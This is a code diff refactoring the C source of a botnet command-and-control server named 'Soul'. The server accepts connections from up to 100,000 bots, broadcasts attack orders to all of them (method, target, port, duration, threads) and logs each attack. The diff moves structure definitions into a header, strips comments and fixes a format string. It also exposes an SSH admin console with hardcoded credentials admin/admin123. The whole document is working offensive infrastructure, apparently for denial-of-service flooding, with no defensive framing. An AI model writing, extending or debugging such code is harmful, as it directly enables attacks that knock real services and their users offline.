@@ -14,37 +14,17 @@
 #include "ascii_art.h"
 #include "network_utils.h"
 #include "ssh_service.h"
+#include "cnc_common.h"  // This now contains the structure definitions
 
 #define CNC_PORT 1930
 #define MAX_BOTS 100000
 #define MAX_ATTACKS 50
 #define MAX_CMD_SIZE 1024
 
-// Bot structure
-typedef struct bot_s {
-    char id[20];
-    char ip[16];
-    int port;
-    time_t last_seen;
-    int socket_fd;
-    int active;
-    pthread_t thread_id;
-} bot_t;
+// Remove the duplicate structure definitions from here
+// They are now in cnc_common.h
 
-// Attack structure
-typedef struct attack_s {
-    int id;
-    char method[50];
-    char target[256];
-    int port;
-    int duration;
-    int threads;
-    time_t start_time;
-    int active;
-    int bot_count;
-} attack_t;
-
-// Global variables
+// Global variables definitions
 bot_t bots[MAX_BOTS];
 attack_t attacks[MAX_ATTACKS];
 int bot_count = 0;
@@ -53,7 +33,7 @@ int cnc_running = 1;
 pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;
 
-// Function prototypes
+// Function prototypes (remove the ones that are in cnc_common.h)
 void* handle_bot_connection(void* socket_ptr);
 void* attack_monitor_thread(void* arg);
 void print_cnc_status();
@@ -70,17 +50,8 @@ void print_welcome_message();
 void print_help();
 void print_methods();
 
-// SSH Service data access functions
-bot_t* get_bots_list(void);
-int get_bot_count(void);
-attack_t* get_attacks_list(void);
-int get_attack_count(void);
-void start_real_attack(const char* method, const char* target, int port, int duration, int threads);
-void stop_real_attack(int attack_id);
-void stop_all_real_attacks(void);
-
 void signal_handler(int sig) {
-    (void)sig; // Mark parameter as used to avoid warning
+    (void)sig;
     printf("\n\033[1;33m[*] Shutting down server...\033[0m\n");
     cnc_running = 0;
 }
@@ -89,7 +60,7 @@ void print_cnc_status() {
     time_t now = time(NULL);
     char time_str[26];
     ctime_r(&now, time_str);
-    time_str[24] = '\0'; // Remove newline
+    time_str[24] = '\0';
     
     printf("\033[1;36m");
     printf("┌────────────────────── Soul SERVER STATUS ──────────────────────┐\n");
@@ -161,7 +132,6 @@ void add_bot(int socket_fd, struct sockaddr_in client_addr) {
     pthread_mutex_lock(&bot_mutex);
     
     if (bot_count < MAX_BOTS) {
-        // Find inactive slot or create new
         int slot = -1;
         for (int i = 0; i < bot_count; i++) {
             if (!bots[i].active) {
@@ -174,7 +144,6 @@ void add_bot(int socket_fd, struct sockaddr_in client_addr) {
             bot_count++;
         }
         
-        // Initialize bot
         bots[slot].socket_fd = socket_fd;
         strcpy(bots[slot].ip, inet_ntoa(client_addr.sin_addr));
         bots[slot].port = ntohs(client_addr.sin_port);
@@ -246,15 +215,11 @@ void start_attack_command(char* command) {
             attacks[attack_count].active = 1;
             attacks[attack_count].bot_count = bot_count;
             
-            // Build attack command for bots
             char attack_cmd[MAX_CMD_SIZE];
             snprintf(attack_cmd, sizeof(attack_cmd), "ATTACK %s %s %d %d %d", 
                     method, target, port, duration, threads);
             
-            // Send to all bots
             broadcast_to_bots(attack_cmd);
-            
-            // Log the attack
             save_attack_log(method, target, port, duration, threads);
             
             printf("\033[1;32m[+] Attack #%d started: %s on %s:%d for %d seconds with %d threads\033[0m\n",
@@ -314,7 +279,7 @@ void save_attack_log(const char* method, const char* target, int port, int durat
         time_t now = time(NULL);
         char time_str[26];
         ctime_r(&now, time_str);
-        time_str[24] = '\0'; // Remove newline
+        time_str[24] = '\0';
         
         fprintf(log_file, "[%s] %s %s:%d %ds %d threads\n", 
                 time_str, method, target, port, duration, threads);
@@ -331,7 +296,7 @@ void load_attack_history() {
 }
 
 void* attack_monitor_thread(void* arg) {
-    (void)arg; // Mark parameter as used
+    (void)arg;
     while (cnc_running) {
         pthread_mutex_lock(&attack_mutex);
         
@@ -369,7 +334,6 @@ void* handle_bot_connection(void* socket_ptr) {
         
         buffer[bytes_received] = '\0';
         
-        // Update bot last seen time
         pthread_mutex_lock(&bot_mutex);
         for (int i = 0; i < bot_count; i++) {
             if (bots[i].socket_fd == socket_fd && bots[i].active) {
@@ -379,7 +343,6 @@ void* handle_bot_connection(void* socket_ptr) {
         }
         pthread_mutex_unlock(&bot_mutex);
         
-        // Process bot messages
         if (strstr(buffer, "STATUS:")) {
             printf("Bot status: %s\n", buffer);
         }
@@ -391,18 +354,16 @@ void* handle_bot_connection(void* socket_ptr) {
 }
 
 void* cnc_bot_listener(void* arg) {
-    (void)arg; // Mark parameter as used
+    (void)arg;
     int server_fd;
     struct sockaddr_in address;
     int opt = 1;
     
-    // Create socket
     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
         perror("Socket creation failed");
         return NULL;
     }
     
-    // Set socket options
     if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
         perror("Setsockopt failed");
         close(server_fd);
@@ -413,14 +374,12 @@ void* cnc_bot_listener(void* arg) {
     address.sin_addr.s_addr = INADDR_ANY;
     address.sin_port = htons(CNC_PORT);
     
-    // Bind socket
     if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
         perror("Bind failed");
         close(server_fd);
         return NULL;
     }
     
-    // Listen for connections
     if (listen(server_fd, 10) < 0) {
         perror("Listen failed");
         close(server_fd);
@@ -441,7 +400,6 @@ void* cnc_bot_listener(void* arg) {
             continue;
         }
         
-        // Handle each bot connection in a separate thread
         pthread_t bot_thread;
         int* new_sock = malloc(sizeof(int));
         *new_sock = client_socket;
@@ -454,7 +412,6 @@ void* cnc_bot_listener(void* arg) {
     return NULL;
 }
 
-// Wrapper function for SSH service thread
 void* ssh_service_wrapper(void* arg) {
     (void)arg;
     start_ssh_service();
@@ -526,7 +483,6 @@ void command_interface() {
             break;
         }
         
-        // Remove newline
         command[strcspn(command, "\n")] = 0;
         
         if (strcmp(command, "help") == 0) {
@@ -574,7 +530,7 @@ void command_interface() {
     }
 }
 
-// SSH Service data access functions
+// SSH Service data access functions (these are defined here but declared in cnc_common.h)
 bot_t* get_bots_list(void) {
     return bots;
 }
@@ -606,34 +562,25 @@ void stop_all_real_attacks(void) {
 }
 
 int main() {
-    // Set signal handlers
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
     
-    // Show banner and initialize
     print_banner();
     printf("\033[1;33m[*] Initializing CNC Server...\033[0m\n");
     print_loading(3);
     
-    // Load attack history
     load_attack_history();
-    
-    // Start SSH service
     start_ssh_in_thread();
     
-    // Start attack monitor thread
     pthread_t monitor_thread;
     pthread_create(&monitor_thread, NULL, attack_monitor_thread, NULL);
     pthread_detach(monitor_thread);
     
-    // Start bot listener in separate thread
     pthread_t listener_thread;
     pthread_create(&listener_thread, NULL, cnc_bot_listener, NULL);
     
-    // Wait a moment for services to start
     sleep(2);
     
-    // Show welcome message
     print_welcome_message();
     print_cnc_status();
     
@@ -641,19 +588,14 @@ int main() {
     printf("\033[1;36m[+] Bot connections on port: %d\033[0m\n", CNC_PORT);
     printf("\033[1;36m[+] SSH access on port: %d\033[0m\n", SSH_PORT);
     printf("\033[1;33m[+] SSH Credentials: admin/admin123 \033[0m\n");
-    printf("\033[1;32m[+] Connect with: ssh  admin@<ur ip>\033[0m\n", SSH_PORT);
+    printf("\033[1;32m[+] Connect with: ssh admin@<your_ip> -p %d\033[0m\n", SSH_PORT);
     printf("\033[1;32m[+] Or use Putty to connect to port %d\033[0m\n\n", SSH_PORT);
     
-    // Start command interface
     command_interface();
     
-    // Cleanup
     printf("\033[1;33m[*] Cleaning up...\033[0m\n");
-    
-    // Stop all attacks
     stop_all_attacks();
     
-    // Close all bot connections
     pthread_mutex_lock(&bot_mutex);
     for (int i = 0; i < bot_count; i++) {
         if (bots[i].active) {
